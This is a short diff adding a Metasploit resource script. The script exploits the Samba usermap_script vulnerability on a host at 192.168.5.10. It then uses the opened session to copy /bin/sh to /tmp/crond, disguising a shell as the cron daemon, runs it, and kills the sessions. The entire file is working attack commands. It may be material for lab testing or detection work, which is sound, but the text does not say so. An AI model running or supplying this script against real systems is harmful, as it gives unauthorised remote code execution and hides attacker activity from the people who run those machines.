@@ -1,0 +1,7 @@
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.5.10
+set LPORT 4545
+exploit -z
+sessions -c 'cp /bin/sh /tmp/crond;' -i 1
+sessions -c 'echo "sleep 5" | /tmp/crond' -i 1
+sessions -K
